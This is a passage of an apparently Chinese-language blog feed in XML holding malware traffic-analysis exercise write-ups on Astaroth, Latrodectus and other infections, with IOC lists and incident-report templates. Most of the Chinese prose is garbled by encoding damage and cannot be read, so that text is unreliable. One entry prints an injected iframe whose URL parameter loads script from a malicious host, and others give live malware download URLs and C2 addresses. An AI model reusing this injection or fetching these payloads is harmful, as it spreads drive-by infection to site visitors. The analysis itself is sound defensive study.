  10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49749 (49749)        705        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4650    2020-06-13 01:17:12.296081    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49745 (49745)        649        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4813    2020-06-13 01:17:13.261739    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49750 (49750)        638        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>5330    2020-06-13 01:17:13.575334    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49751 (49751)        585        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>5776    2020-06-13 01:17:14.014885    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49752 (49752)        668        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>8359    2020-06-13 01:17:15.790515    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49753 (49753)        816        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>8539    2020-06-13 01:17:17.284101    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49754 (49754)        890        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>8550    2020-06-13 01:17:18.846653    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49755 (49755)        798        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>8562    2020-06-13 01:17:20.377579    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49756 (49756)        918        Intel_6d:fc:e2    Cisco_29:41:7d</p></li></ul></li></ul><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://traffic.y1ng.org/0x4_27-8-2020/">FRANK-N-TED (WHATâ€™S GOING ON?) - Traffic Analysis Train</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2020-06-12-TRAFFIC-ANALYSIS-EXERCISE-FRANK-N-TED-WHATâ€™S-GOING-ON&quot;&gt;&lt;a href=&quot;#2020-06-12-TRAFFIC-ANALYSIS-EXERCISE-FRANK-N-TED-WHATâ€™S-GOING-ON&quot; class=&quot;headerlink&quot; title=&quot;2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHATâ€™S GOING ON?)&quot;&gt;&lt;/a&gt;2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHATâ€™S GOING ON?)&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION</title>
    <link href="https://2in9ya2.github.io/20240405-Malware/"/>
    <id>https://2in9ya2.github.io/20240405-Malware/</id>
    <published>2024-04-13T04:57:12.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-04-05-THURSDAY-DATA-DUMP-FROM-ASTAROTH-GUILDMA-MALWARE-INFECTION"><a href="#2024-04-05-THURSDAY-DATA-DUMP-FROM-ASTAROTH-GUILDMA-MALWARE-INFECTION" class="headerlink" title="2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION"></a>2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="HTTPæµ"><a href="#HTTPæµ" class="headerlink" title="HTTPæµ"></a>HTTPæµ</h3><p>é¦–å…ˆæŸ¥çœ‹<code>HTTP</code>æµï¼Œå¹¶è¿½è¸ªç¬¬ä¸€æ¡æµ</p><p><img src="/images/20240405-Malware/2024-04-13-13-19-32-image.png"></p><p>è¿”å›çš„<code>HTML</code>ä»£ç çš„ä½œç”¨æ˜¯åœ¨å½“å‰é¡µé¢ä¸­åµŒå…¥äº†ä¸€ä¸ª <code>iframe</code>å…ƒç´ ï¼Œè¯¥ <code>iframe</code>åŠ è½½äº†æŒ‡å®šçš„ <code>URL</code>ã€‚è¯¥ <code>URL</code> ä¸­çš„å‚æ•° <code>searchString</code> åŒ…å«äº†ä¸€äº›<code>JavaScript</code>ä»£ç ï¼Œå…¶ä¸­å¼•å…¥äº† <code>jQuery</code>åº“ï¼Œå¹¶åŠ è½½äº†å¦ä¸€ä¸ª<code>JavaScript</code> æ–‡ä»¶</p><p><img src="/images/20240405-Malware/2024-04-13-13-21-02-image.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;margin:0;padding:0;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;position:relative; top: -104px; left: -141px;width:10;height:10&quot;</span> <span class="attr">allowtransparency</span>=<span class="string">&quot;true&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://biosuperdeal.be/index.php?searchString=%3Cscript%20src=%22https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%20src=%22http://eeiufr.neoburst.company/74262421815720Z1iFaTEnQ76IoEzkmhPMkFUzvGd2Vk4o2934293112/Imprimir_DACTEs_73262593.doa_..%22%3E&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿½è¸ªç¬¬äºŒæ¡<code>HTTP</code>æµï¼Œå‘ç°å…¶å“åº”äº†ä¸€ä¸ª<code>JS</code>ä»£ç </p><p><img src="/images/20240405-Malware/2024-04-13-13-31-00-image.png"></p><p>è¿™ä¸ª<code>JS</code>ä»£ç çš„å˜é‡åå’Œå‡½æ•°åçœ‹èµ·æ¥éƒ½æ˜¯éšæœºç”Ÿæˆçš„</p><p><img src="/images/20240405-Malware/2024-04-13-13-39-16-image.png"></p><p>ä½¿ç”¨äº†<code>WScript.Shell</code>å¯¹è±¡ï¼Œè¿™é€šå¸¸ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p><img src="/images/20240405-Malware/2024-04-13-13-49-15-image.png"></p><p><code>KUGvzmueVhJnAlPYGL</code>å‡½æ•°ç”¨äºç”Ÿæˆä¸€ä¸ªå€¼ï¼Œæ ¹æ®å€¼çš„ä¸åŒ<code>ykCZgNvJcLaKRUUaoTjd</code>è¢«èµ‹äºˆä¸åŒçš„åœ°å€</p><p><img src="/images/20240405-Malware/2024-04-13-13-44-32-image.png"></p><p>åé¢ä¼¼ä¹è¿˜è¿è¡Œäº†<code>CMD</code>å‘½ä»¤ï¼Œçœ‹èµ·æ¥ä¼¼ä¹æ˜¯æ¶æ„ä»£ç </p><p><img src="/images/20240405-Malware/2024-04-13-13-46-34-image.png"></p><p>å°†ä¸‹é¢æµçš„åŸŸå<code>e9h47j3aey4.findbusca.store</code>åœ¨ä¸Šä¸€æ¡æµä¸­çš„åœ°å€ä¸­æŸ¥æ‰¾ï¼Œå‘ç°å­˜åœ¨ã€‚å¯èƒ½çš„æƒ…å†µæ˜¯ç”¨æˆ·è®¿é—®äº†<code>http://eeiufr.neoburst.company/74262421815720Z1iFaTEnQ76IoEzkmhPMkFUzvGd2Vk4o2934293112/Imprimir_DACTEs_73262593.do</code>ç„¶å<code>JS</code>ä»£ç æ‰§è¡Œï¼Œéšåè®¿é—®äº†<code>http://e9h47j3aey4.findbusca.store/?77226593077628733</code></p><p><img src="/images/20240405-Malware/2024-04-13-13-51-19-image.png"></p><p>è¿½è¸ªè¿™æ¡æµï¼Œé¦–å…ˆè¯·æ±‚æœåŠ¡å™¨è¿”å›<code>http://e9h47j3aey4.findbusca.store/?77226593077628733</code>çš„<code>HTTP</code>æ ‡å¤´ä¿¡æ¯ï¼Œå‘ç°å…¶æ˜¯<code>.zip</code>æ–‡ä»¶</p><p><img src="/images/20240405-Malware/2024-04-13-13-54-39-image.png"></p><p> åŒæ ·æ–¹æ³•æŸ¥çœ‹ï¼Œå‘ç°å…¶è¿”å›äº†å‡ ä¸ª<code>.zip</code>æ–‡ä»¶ï¼Œåˆ†åˆ«ä¸ºgltGlAzqRU.zipã€CoAaOeqlDZ.zipã€xIARkijOeZ.zipã€AyxnzbzCdp.zipï¼Œä¸‹è½½ååˆ†æï¼ˆ<strong>æ³¨æ„ï¼šè¯·å‹¿åœ¨ä¸ªäººç”µè„‘ä¸Šä¸‹è½½ï¼Œè¯·åœ¨è™šæ‹Ÿæœºå†…åˆ†æ</strong>ï¼‰</p><p><img src="/images/20240405-Malware/2024-04-13-14-13-40-image.png"><br>ç¬¬ä¸€ä¸ªæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé€šè¿‡æŸ¥è¯¢å…¶<code>sha256</code>å€¼ï¼Œå‘ç°å…¶ä¸ºæ¶æ„è½¯ä»¶</p><p><img src="/images/20240405-Malware/2024-04-13-14-16-46-image.png"></p><p>åé¢è¿™ä¸‰ä¸ªä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œå‰©ä¸‹çš„å°±æ²¡ä»€ä¹ˆæ€è·¯äº†ï¼ˆæœ‰å…¶ä»–çš„æƒ³æ³•è¯·<a href="https://twitter.com/2in9ya2">twitter</a>ï¼‰</p><p><strong>(ä»¥ä¸‹æœªå®Œæˆ)</strong></p><h3 id="çº¿ç´¢æ¢³ç†"><a href="#çº¿ç´¢æ¢³ç†" class="headerlink" title="çº¿ç´¢æ¢³ç†"></a>çº¿ç´¢æ¢³ç†</h3><ul><li>Environmentï¼ˆè°ƒæŸ¥çš„èµ„äº§ä¿¡æ¯&#x2F;ç¯å¢ƒï¼‰<ul><li>LAN segment range</li><li>Domain</li><li>Domain controller</li><li>LAN segment gateway</li><li>LAN segment broadcast address</li></ul></li><li>Incident Report<ul><li>Executive summaryï¼ˆæ„ŸæŸ“è¿‡ç¨‹æ€»ç»“ï¼‰</li><li>Victim detailsï¼ˆå—å®³è€…ç»†èŠ‚ï¼‰<ul><li>IP address</li><li>MAC address</li><li>User account name</li></ul></li><li>Indicators of compromise (IOCs)<ul><li>SHA256 hash</li><li>File size</li><li>File name</li><li>File location</li><li>File descriptionï¼š</li></ul></li><li>HTTP traffic to retrieve the malware<ul><li>å³ ä¸‹è½½æ¶æ„æ–‡ä»¶çš„HTTPæµé‡è®°å½•</li></ul></li><li>HTTP traffic for remote request infection activity<ul><li>å³ æ„ŸæŸ“ç›¸å…³çš„è¿œç¨‹è¯·æ±‚æ´»åŠ¨çš„HTTPæµé‡è®°å½•</li></ul></li><li>INVESTIGATIONï¼ˆè°ƒæŸ¥è¿‡ç¨‹ï¼‰<ul><li>æœ€åå¯ä»¥ç»™ä¸€ä¸ªç²¾ç®€çš„æµç¨‹å›¾</li></ul></li></ul></li></ul><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2024-04-05-THURSDAY-DATA-DUMP-FROM-ASTAROTH-GUILDMA-MALWARE-INFECTION&quot;&gt;&lt;a href=&quot;#2024-04-05-THURSDAY-DATA-DUMP-FROM-ASTAROTH-GUILDMA-MALWARE-INFECTION&quot; class=&quot;headerlink&quot; title=&quot;2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION&quot;&gt;&lt;/a&gt;2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>DATA DUMP FROM LATRODECTUS INFECTION</title>
    <link href="https://2in9ya2.github.io/20240409-Malware/"/>
    <id>https://2in9ya2.github.io/20240409-Malware/</id>
    <published>2024-04-12T02:41:48.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-04-09-TUESDAY-DATA-DUMP-FROM-LATRODECTUS-INFECTION"><a href="#2024-04-09-TUESDAY-DATA-DUMP-FROM-LATRODECTUS-INFECTION" class="headerlink" title="2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION"></a>2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="HTTPæµ"><a href="#HTTPæµ" class="headerlink" title="HTTPæµ"></a>HTTPæµ</h3><p>é€šè¿‡å‘½ä»¤<code>http.response.code==200</code>æŸ¥çœ‹è¿”å›æˆåŠŸçš„<code>http</code>æµé‡ï¼Œå¹¶é€ä¸€è¿½è¸ª</p><p><img src="/images/20240409-Malware/2024-04-12-14-01-25-image.png"></p><p>è¿™ä¸ªäº¤äº’çœ‹èµ·æ¥åƒæ˜¯è¿›è¡Œäº†ä¸€ä¸ª <code>OCSP</code>ï¼ˆåœ¨çº¿è¯ä¹¦çŠ¶æ€åè®®ï¼‰æŸ¥è¯¢ã€‚åœ¨æ­¤æŸ¥è¯¢ä¸­ï¼Œå®¢æˆ·ç«¯è¯·æ±‚æŸä¸ªè¯ä¹¦çš„çŠ¶æ€ï¼Œè€ŒæœåŠ¡å™¨<code>ï¼ˆocsp.digicert.comï¼‰</code>åˆ™è¿”å›äº†è¯¥è¯ä¹¦çš„çŠ¶æ€ä¿¡æ¯ï¼ˆå³ <code>OCSP</code> å“åº”ï¼‰</p><p><img src="/images/20240409-Malware/2024-04-12-14-02-31-image.png"></p><p>ç¬¬äºŒæ¡æµè¯·æ±‚äº†è¯ä¹¦<img src="/images/20240409-Malware/2024-04-12-14-04-02-image.png"> </p><p>ç¬¬ä¸‰æ¡æµæ˜¯ä¸€ä¸ª <code>OPTIONS</code> è¯·æ±‚ï¼Œç”¨äºæŸ¥è¯¢æœåŠ¡å™¨æ”¯æŒçš„æ–¹æ³•ã€‚<code>87.249.49.206</code>æœåŠ¡å™¨è¿”å›äº†çŠ¶æ€ç  <code>200 OK</code>ï¼Œè¡¨ç¤ºè¯·æ±‚æˆåŠŸï¼Œå¹¶åœ¨å“åº”å¤´éƒ¨ä¸­åˆ—å‡ºäº†æœåŠ¡å™¨æ”¯æŒçš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ <code>OPTIONS, HEAD, GET, PROPFIND, DELETE, COPY, MOVE, PROPPATCH, LOCK, UNLOCK</code></p><p><img src="/images/20240409-Malware/2024-04-12-14-06-15-image.png"></p><p>ç¬¬å››æ¡æµæ˜¯ä¸€ä¸ª <code>OPTIONS</code> è¯·æ±‚ï¼Œç”¨äºæŸ¥è¯¢<code>87.249.49.206</code>æœåŠ¡å™¨å¯¹ <code>/share</code> èµ„æºæ”¯æŒçš„æ–¹æ³•ã€‚æœåŠ¡å™¨è¿”å›äº†çŠ¶æ€ç  <code>200 OK</code>ï¼Œè¡¨ç¤ºè¯·æ±‚æˆåŠŸï¼Œå¹¶åœ¨å“åº”å¤´éƒ¨ä¸­åˆ—å‡ºäº†æœåŠ¡å™¨æ”¯æŒçš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ <code>OPTIONS, HEAD, GET, PROPFIND, DELETE, COPY, MOVE, PROPPATCH, LOCK, UNLOCK</code></p><p><img src="/images/20240409-Malware/2024-04-12-14-13-07-image.png"></p><p>ç¬¬äº”æ¡æµï¼Œè¯·æ±‚æœåŠ¡å™¨<code>/share/esetond.msi</code>ï¼ŒæœåŠ¡å™¨è¿”å›äº†ä¸€ä¸ª<code>.msi</code>æ–‡ä»¶</p><p><img src="/images/20240409-Malware/2024-04-12-14-13-54-image.png"></p><p>æŸ¥è¯¢åŸŸåå‘ç°å…¶å¯èƒ½ä¸ºæ¶æ„åœ°å€</p><p><img src="/images/20240409-Malware/2024-04-12-14-19-17-image.png"></p><p>å°†<code>.msi</code>æ–‡ä»¶çš„<code>sha256</code>å€¼åœ¨<code>virustotal</code>ä¸­æŸ¥è¯¢ï¼Œå‘ç°å…¶ä¸ºæ¶æ„è½¯ä»¶</p><p><img src="/images/20240409-Malware/2024-04-12-14-20-48-image.png"></p><h3 id="MSIæ–‡ä»¶åˆ†æ"><a href="#MSIæ–‡ä»¶åˆ†æ" class="headerlink" title=".MSIæ–‡ä»¶åˆ†æ"></a>.MSIæ–‡ä»¶åˆ†æ</h3><p>ä¸€äº›æ¶æ„ä»£ç å¯èƒ½åµŒå…¥åˆ°<code>.msi</code>æ–‡ä»¶ä¸­ï¼Œæ•…é€šè¿‡<a href="https://learn.microsoft.com/zh-tw/windows/win32/msi/orca-exe">Orca</a>å¯¹<code>.MSI</code>æ–‡ä»¶è¿›è¡Œåˆ†æï¼Œ<a href="https://rvsec0n.wordpress.com/2020/02/22/msi-malware-analysis/">åˆ†ææ–¹æ³•</a>å‚è€ƒï¼ˆ<strong>æ³¨æ„ï¼šè¯·å‹¿åœ¨ä¸ªäººç”µè„‘ä¸Šåˆ†æï¼Œè¯·åœ¨è™šæ‹Ÿæœºå†…åˆ†æ</strong>ï¼‰</p><p>å…¶äºŒè¿›åˆ¶è¡¨å¦‚ä¸‹ï¼Œå…¶ä¸­åŒ…æ‹¬<code>exeã€jpgã€dll</code>ä»¥åŠå…¶ä»–æ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="/images/20240409-Malware/2024-04-12-15-47-48-image.png"></p><p>å…¶æ–‡ä»¶è¡¨åªåŒ…å«ä¸€ä¸ª<code>Util.dll</code>æ–‡ä»¶</p><p><img src="/images/20240409-Malware/2024-04-12-16-00-58-image.png">  </p><p>ç»„ä»¶è¡¨æ˜¯å…·æœ‰ç”¨äºæŒ‡å®šå°†.cabä¸­å­˜åœ¨çš„æ–‡ä»¶å®‰è£…åˆ°å“ªé‡Œçš„åŠŸèƒ½è¡¨</p><p><img src="/images/20240409-Malware/2024-04-12-16-04-29-image.png"></p><p>æ§åˆ¶è¡¨ï¼ˆæˆ‘çŒœæ˜¯ç”¨äºç¨‹åºçš„æ§åˆ¶ï¼Œæ¯”å¦‚<code>PushButton</code>ï¼‰</p><p><img src="/images/20240409-Malware/2024-04-12-16-06-58-image.png"> </p><p><strong>CustomAction Table</strong> å‚è€ƒé‡Œé¢è¯´æ˜¯æœ€é‡è¦çš„è¡¨æ ¼ã€‚ï¼ˆä¸çŸ¥é“éƒ½è¿è¡Œäº†ä»€ä¹ˆ0.0ï¼‰å¤šæ•°<code>Action</code>è¿è¡Œäº†<code>aicustact.dll</code></p><p><img src="/images/20240409-Malware/2024-04-12-16-08-23-image.png">  </p><p>ä½¿ç”¨ msi çš„æ³¨å†Œè¡¨åŠŸèƒ½åœ¨æ³¨å†Œè¡¨é”®<code> Software\[Manufacturer]\[ProductName]</code>ä¸­æ³¨å†Œå€¼</p><p><img src="/images/20240409-Malware/2024-04-12-16-21-23-image.png"></p><p>æ²¡æœ‰å‘ç°ä»»ä½•çº¿ç´¢ï¼Œå¯èƒ½æˆ‘çš„åˆ†ææ–¹æ³•æœ‰é—®é¢˜ï¼Œå¦‚æœæœ‰ä»»ä½•å»ºè®®è¯·è®¿é—®æˆ‘çš„<a href="https://twitter.com/2in9ya2">twitter</a>ï¼Œè”ç³»æˆ‘ã€‚</p><p>åˆ©ç”¨<code>foremost</code>å¯¹<code>msi</code>æ–‡ä»¶è¿›è¡Œåˆ†ç¦»</p><p><img src="/images/20240409-Malware/2024-04-12-16-35-23-image.png"></p><p>æŸ¥çœ‹<code>exe</code>æ–‡ä»¶çš„<code>sha256</code>å€¼ï¼Œå¹¶é€šè¿‡<code>virustotal</code>æŸ¥è¯¢ï¼Œå‘ç°å…¶ä¸º<code>AIDetectMalware</code>ï¼Œ</p><p><code>dll</code>æ–‡ä»¶æœªå‘ç°é—®é¢˜</p><p><img src="/images/20240409-Malware/2024-04-12-16-38-35-image.png"></p><h3 id="åŠ å¯†æµ"><a href="#åŠ å¯†æµ" class="headerlink" title="åŠ å¯†æµ"></a>åŠ å¯†æµ</h3><p>åœ¨è·å–<code>.msi</code>æ–‡ä»¶ä¹‹å‰ï¼Œå—å®³ä¸»æœºå’Œ<code>87.249.49.206</code>è¿›è¡Œäº†ä¸€æ®µæ—¶é—´çš„åŠ å¯†é€šä¿¡</p><p><img src="/images/20240409-Malware/2024-04-12-17-10-00-image.png"></p><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><p>å¹¶æ²¡æœ‰å‘ç°é¢˜ç›®é‡Œæä¾›çš„æ–‡ä»¶ï¼ˆå¤§å¤±è´¥ T Tï¼Œå¦‚æœä½ å‘ç°äº†è¯·è”ç³»æˆ‘<a href="https://twitter.com/2in9ya2">twitter</a>ï¼‰</p><p> <img src="/images/20240409-Malware/2024-04-12-16-42-27-image.png"></p><h3 id="çº¿ç´¢æ¢³ç†"><a href="#çº¿ç´¢æ¢³ç†" class="headerlink" title="çº¿ç´¢æ¢³ç†"></a>çº¿ç´¢æ¢³ç†</h3><ul><li>Environmentï¼ˆè°ƒæŸ¥çš„èµ„äº§ä¿¡æ¯&#x2F;ç¯å¢ƒï¼‰<ul><li>LAN segment range:10.4.9.0&#x2F;24</li><li>Domain:-</li><li>Domain controller:10.4.9.1</li><li>LAN segment gateway:10.4.9.1</li><li>LAN segment broadcast address:10.4.9.255</li></ul></li><li>Incident Report<ul><li>Executive summary:<br>ç”¨æˆ·è¢«åµŒå…¥æ¶æ„è½¯ä»¶çš„.msiæ–‡ä»¶æ„ŸæŸ“</li><li>Victim details<ul><li>IP address:10.4.9.101</li><li>MAC address:00:26:c7:2f:c6:7e</li><li>User account name:-</li></ul></li><li>Indicators of compromise (IOCs)<ul><li>SHA256 hash:08075e8a6dcc6a5fca089348edbd5fc07b2b0b26a26a46e0dd401121fdaa88d3</li><li>File size:1,649,664 å­—èŠ‚</li><li>File name:esetnod.msi</li><li>File location:<a href="http://kosukeshimura.com/share/esetnod.msi">http://kosukeshimura.com/share/esetnod.msi</a></li><li>File description:è¢«æ¶æ„è½¯ä»¶åµŒå…¥çš„.msiæ–‡ä»¶</li></ul></li><li>HTTP traffic to retrieve the malware<ul><li>5663    2024-04-10 07:44:29.351877    10.4.9.101    87.249.49.206    HTTP    kosukeshimura.com    GET &#x2F;share&#x2F;esetnod.msi HTTP&#x2F;1.1     http (80)    50367 (50367)        246        Intel_2f:c6:7e    Cisco_30:22:43</li></ul></li></ul></li></ul><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2024-04-09-TUESDAY-DATA-DUMP-FROM-LATRODECTUS-INFECTION&quot;&gt;&lt;a href=&quot;#2024-04-09-TUESDAY-DATA-DUMP-FROM-LATRODECTUS-INFECTION&quot; class=&quot;headerlink&quot; title=&quot;2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION&quot;&gt;&lt;/a&gt;2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS</title>
    <link href="https://2in9ya2.github.io/20200731-Malware/"/>
    <id>https://2in9ya2.github.io/20200731-Malware/</id>
    <published>2024-04-11T06:36:47.000Z</published>
    <updated>2025-08-25T07:52:22.811Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-07-31-TRAFFIC-ANALYSIS-EXERCISE-TECSOLUTIONS"><a href="#2020-07-31-TRAFFIC-ANALYSIS-EXERCISE-TECSOLUTIONS" class="headerlink" title="2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS"></a>2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="HTTPæµ"><a href="#HTTPæµ" class="headerlink" title="HTTPæµ"></a>HTTPæµ</h3><p>é¦–å…ˆè¿‡æ»¤HTTPæµå¹¶è¿½è¸ª</p><p><img src="/images/20200731-Malware/2024-04-11-14-44-25-image.png"></p><p> å‘ç°åŸŸå<code>e-dsm.com.br</code>è¿”å›äº†ä¸€ä¸ª<code>doc</code>æ–‡ä»¶<img src="/images/20200731-Malware/2024-04-11-14-45-30-image.png"></p><p>åŸŸå<code>jambino.us</code>è¿”å›äº†ä¸€ä¸ª<code>exe</code>å¯æ‰§è¡Œæ–‡ä»¶</p><p><img src="/images/20200731-Malware/2024-04-11-14-48-18-image.png"></p><p>éšåä¸æ–­çš„å‘<code>201.235.10.215</code> <code>IP</code>åœ°å€<code>POST</code>æ•°æ®</p><p><img src="/images/20200731-Malware/2024-04-11-14-54-58-image.png"></p><p><img src="/images/20200731-Malware/2024-04-11-14-51-01-image.png"></p><p>å°†docæ–‡ä»¶å’Œexeæ–‡ä»¶å¯¼å‡ºï¼ˆ<strong>æ³¨æ„ï¼šè¯·å‹¿åœ¨ä¸ªäººç”µè„‘ä¸Šå¯¼å‡ºï¼Œè¯·åœ¨è™šæ‹Ÿæœºå†…å¯¼å‡º</strong>ï¼‰</p><p><img src="/images/20200731-Malware/2024-04-11-14-59-49-image.png"></p><p>ä½¿ç”¨<code>binwalk</code>å¯¹<code>doc</code>æ–‡ä»¶è¿›è¡Œåˆ†æ</p><p><img src="/images/20200731-Malware/2024-04-11-15-01-07-image.png"></p><p>ä½¿ç”¨<code>foremost</code>å°†æ–‡ä»¶å¯¼å‡ºï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>ole</code>æ–‡ä»¶å¤¹å’Œä¸€ä¸ª<code>zip</code>æ–‡ä»¶å¤¹ï¼Œzipæ–‡ä»¶å†…ä¸º<code>xml</code>æ–‡ä»¶</p><p><img src="/images/20200731-Malware/2024-04-11-15-02-00-image.png"></p><p>è®¡ç®—<code>.ole</code>æ–‡ä»¶çš„<code>MD5</code>å€¼ï¼Œå¹¶åœ¨<code>virustotal</code>å†…æŸ¥è¯¢ï¼Œå‘ç°å…¶ä¸ºæœ¨é©¬ä¸‹è½½å™¨ï¼Œé‚£ä¹ˆåç»­<code>exe</code>æ–‡ä»¶åˆ™ä¸ºå¯æ‰§è¡Œæœ¨é©¬ç¨‹åº</p><p><img src="/images/20200731-Malware/2024-04-11-15-05-57-image.png"></p><p>è®¡ç®—<code>exe</code>æ–‡ä»¶çš„<code>MD5</code>å€¼ï¼Œå¹¶åœ¨<code>virustotal</code>å†…æŸ¥è¯¢ï¼Œç¡®å®šå…¶ä¸ºæœ¨é©¬ç¨‹åº<img src="/images/20200731-Malware/2024-04-11-15-08-00-image.png"></p><h3 id="C2æµé‡"><a href="#C2æµé‡" class="headerlink" title="C2æµé‡"></a>C2æµé‡</h3><p>ä¸‹è½½æœ¨é©¬ç¨‹åºä¹‹åï¼Œä¸»æœº<code>10.7.31.101</code>ä¸ä¸»æœºä¸º<code>201.235.10.215</code>ã€<code>104.236.52.89:8080</code>äº¤äº’é¢‘ç¹</p><p><img src="/images/20200731-Malware/2024-04-11-15-22-57-image.png"></p><h3 id="åŠ å¯†æµ"><a href="#åŠ å¯†æµ" class="headerlink" title="åŠ å¯†æµ"></a>åŠ å¯†æµ</h3><p>æ— å¯ç–‘åœ°å€</p><h3 id="å…¶ä»–æµ"><a href="#å…¶ä»–æµ" class="headerlink" 